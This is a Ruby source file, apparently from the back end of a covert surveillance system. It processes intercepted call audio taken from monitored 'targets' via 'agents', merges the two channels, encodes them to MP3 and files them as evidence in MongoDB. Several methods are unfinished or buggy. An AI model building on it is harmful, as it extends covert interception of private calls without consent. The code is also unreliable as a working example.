module RCS
module Worker

require 'ffi'
require 'mongo'
require 'mongoid'
require 'rcs-common/trace'
require_relative 'speex'
require_relative 'wave'
require_relative 'src'
require_relative 'mp3lame'

require 'digest/md5'

class AudioProcessingError < StandardError
  attr_reader :msg
  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

class Channel
  include Tracer
  attr_reader :name, :sample_rate, :start_time, :last_stop_time, :wav_data, :status
  
  def initialize(evidence)
    @id = BSON::ObjectId.new
    @name = evidence[:data][:channel].to_s
    @sample_rate = evidence[:data][:sample_rate]
    @start_time = evidence[:data][:start_time]
    @last_stop_time = @start_time
    @wav_data = Array.new # array of 32 bit float samples
    @status = :open
    trace :debug, "[#{@id}] CREATING NEW CHANNEL #{@name} - start_time: #{@start_time} sample_rate: #{@sample_rate}"
  end
  
  def id
    "#{@name}:#{@sample_rate}:#{@start_time.to_f}:#{@last_stop_time.to_f}:#{@status.to_s}"
  end
  
  def self.other_than channel
    channel == :incoming ? :outgoing : :incoming
  end
  
  def close!
    @status = :closed
    trace :debug, "[#{@id}] closing channel #{self.id}"
  end
  
  def closed?
    @status == :closed
  end
  
  def fill(gap)
    samples_to_fill = @sample_rate * gap
    trace :debug, "[#{@id}] filling with #{samples_to_fill} samples(@#{@sample_rate}) to fill #{gap} seconds of missing data."
    @wav_data.concat [0.0] * samples_to_fill.ceil
  end
  
  def time_gap(evidence)
    gap = evidence[:data][:start_time].to_f - @last_stop_time.to_f
    trace :debug, "[#{@id}]#{@last_stop_time} to #{evidence[:data][:start_time]} => #{gap}"
    trace :fatal, "[#{@id}] *** NEGATIVE GAP ***" if gap < 0
    gap
  end
  
  def accept?(evidence)
    if closed? 
      trace :debug, "[#{@id}] CHANNEL IS CLOSED, REFUSING ..."
      return false
    end
    if time_gap(evidence) >= 5.0
      trace :debug, "[#{@id}] TIME GAP IS HIGHER THAN 5 SECONDS !!! REFUSING ..."
      return false
    end
    return true
  end
  
  def feed(evidence)
    #trace :debug, "Evidence channel #{evidence[:data][:channel]} peer #{evidence[:data][:peer]} with #{evidence[:wav].bytesize} bytes of data."
    
    gap = time_gap(evidence)
    fill gap unless gap == 0
    
    @last_stop_time = evidence[:data][:stop_time]
    trace :debug, "[#{@id}] NEW STOP TIME #{@last_stop_time}"
    @wav_data.concat evidence[:wav].unpack 'F*' # 16 bit samples
  end
  
  def resample(to_sample_rate)
    SRC::new(SRC::SINC_MEDIUM_QUALITY, 1, nil)
    src_data = SRC::DATA.new
    src_data.end_of_input = 0
    src_data.input_frames = 0
    
    data_in_buffer = FFI::MemoryPointer.new(:float, @wav_data.size)
    data_in_string = @wav_data.pack('C*')
    data_in_buffer.put_bytes(0, data_in_string, 0, data_in_string.size)
    src_data.data_in = data_in_buffer
  end
  
  def size
    @wav_data.size
  end

  def to_s
    self.id
  end
end

class Call
  include Tracer
  attr_writer :start_time
  attr_reader :id, :peer
  
  # status of call can be:
  #   - :queueing only first channel is present, queue data, maintain speex
  #   - :fillin   second channel arrived, fill in later channel with silence
  #   - :resampling second channel arrived, filled in, resample data as they arrive
  
  def initialize(peer, program, start_time, agent, target)
    @id = BSON::ObjectId.new
    @peer = peer
    @start_time = start_time
    @status = :queueing
    @channels = {}
    @program = program
    @duration = 0
    @resampled = :not_yet
    trace :info, "[#{@id}] created new call for #{@peer}, starting at #{@start_time}"
    @raw_ids = []

    @agent = agent
    @target = target

    @evidence = store peer, program, start_time, agent, target
  end
  
  def id
    "#{@peer}:#{@start_time.to_f}"
  end
  
  def queueing?
    @channels.size < 2
  end

  def accept?(evidence)
    # peer must be the same!
    return false if evidence[:data][:peer] != @peer
    
    # we accept evidence only if relative channel accept it
    channel = get_channel evidence
    return channel.accept? evidence unless channel.nil?
    
    # if not sure, this is probably another call
    return false
  end

  def end_call?(evidence)
    return true if evidence[:data][:grid_content].bytesize == 4 and evidence[:data][:grid_content] == "\xff\xff\xff\xff"
  end
  
  def get_channel(evidence)
    channel = @channels[evidence[:data][:channel]] 
    channel ||= create_channel(evidence)
    return channel if channel.accept? evidence
    return nil
  end
  
  def create_channel(evidence)
    channel = Channel.new evidence
    @channels[evidence[:data][:channel]] = channel
    
    # fix start time
    a = channels_by_start_time
    @start_time = a[0].start_time
    
    # fill in later channel
    if a.size > 1
      fillin_gap = a[1].start_time - a[0].start_time
      trace :debug, "[#{@id}] FILLING #{fillin_gap.to_f} SECS ON CHANNEL #{a[1].name}"
      a[1].fill(fillin_gap)
    end
    
    return channel
  end
  
  def closed?
    closed_channels = @channels.select {|k,v| v.closed? unless v.nil? }
    return closed_channels.size == @channels.size
  end
  
  def feed(evidence)

    @raw_ids << evidence[:db_id]

    # if evidence is empty or call is closed, refuse feeding
    return false if evidence[:wav].bytesize == 0
    return false if closed?

    if end_call? evidence
      @channels.each {|c| c.close!}
      trace :debug, "[#{@id}] closing call for #{@peer}, starting at #{@start_time}"
      return true
    end

    # get the correct channel for the evidence
    channel = get_channel(evidence)
    #return false if channel.nil?
    
    trace :debug, "[#{@id}] feeding #{evidence[:wav].bytesize} bytes at #{evidence[:data][:start_time]}:#{evidence[:data][:last_stop_time]} to #{channel.id}"
    channel.feed evidence
    
    # update status
    update_status
    
    unless queueing?
      lower_sample_rate = (@channels.values.min_by {|c| c.sample_rate}).sample_rate
      trace :debug, "[#{@id}] COMMON SAMPLE RATE #{lower_sample_rate}"

      # downsample channel with higher sample rate


      # take channel with higher sample rate and resample accordingly            
      @encoder ||= ::MP3Encoder.new(2, sample_rate)
      unless @encoder.nil?
        @encoder.feed(@channels[:outgoing].wav_data, @channels[:incoming].wav_data) do |mp3_bytes|
          File.open("#{@id}.mp3", 'ab') {|f| f.write(mp3_bytes) }

          db = Mongoid.database
          fs = Mongo::GridFileSystem.new(db, "grid.#{@target[:_id]}")
          data = ''
          fs.open(file_name, 'a') do |f|
            f.write mp3_bytes

            @evidence.update_attributes("data._grid" => f.files_id)
            @evidence.update_attributes("data._grid_size" => f.file_length)
          end

          yield mp3_bytes if block_given?
        end
      end
    end

    return true
  end

  def store(peer, program, start_time, agent, target)
    evidence = ::Evidence.collection_class(target[:_id].to_s)
    evidence.create do |ev|
      ev.aid = agent[:_id].to_s
      ev.type = :call

      ev.da = start_time
      ev.dr = Time.now.to_i
      ev.rel = 0
      ev.blo = false
      ev.note = ""

      ev.data ||= Hash.new
      ev.data[:peer] = peer
      ev.data[:program] = program
      ev.data[:duration] = 0
      ev.data[:status] = :recording

      ev.save
    end
  end

  def file_name
    Digest::MD5.hexdigest "#{@peer}:#{@program}:#{@start_time}"
  end

  def sample_rates
    @channels.values.collect {|c| c.sample_rate}
  end

  def min_sample_rate
    sample_rates.sort.first
  end
  
  def update_status
    if @channels.size < 2
      @status == :queueing
      return
    else # we have (at least) two channels
      @status == :fillin
      trace :debug, "Lesser sample rate: #{min_sample_rate}, will be used for resampling."
    end
  end
  
  def to_s
    string = "---\nCALL #{self.id}\n"
    @channels.each {|k, c| string += "\t- #{k} #{c.seconds} #{c.num_samples}\n" }
    string += "---\n"
    return string
  end
   
  def channels_by_start_time
    @channels.values.minmax_by {|c| c.start_time }
  end
end

class CallProcessor
  include Tracer
  require 'pp'
  
  def initialize(agent, target)
    @agent = agent
    @target = target
    @calls = []
  end
  
  def get_call(evidence)
    # if peer is unknown or evidence is empty, evidence is invalid, ignore it
    return nil if evidence[:data][:peer].empty? or evidence[:wav].empty?
    
    open_calls = @calls.select {|c| c.accept? evidence and not c.closed? }
    return open_calls.first unless open_calls.empty?

    # no valid call was found, we need to create a new one
    call = create_call evidence
    return call
  end
  
  def create_call(evidence)
    call = Call.new(evidence[:data][:peer], evidence[:data][:program], evidence[:data][:start_time], @agent, @target)
    trace :info, "CREATED NEW CALL #{call.id}"
    @calls << call
    call
  end
  
  def feed(evidence)
    call = get_call evidence
    call.feed evidence unless call.nil?
    nil
  end
  
  def to_s
    string = ''
    @calls.each do |c|
      string += "#{c}\n"
    end
    return string
  end
end

end # Audio::
end # RCS::
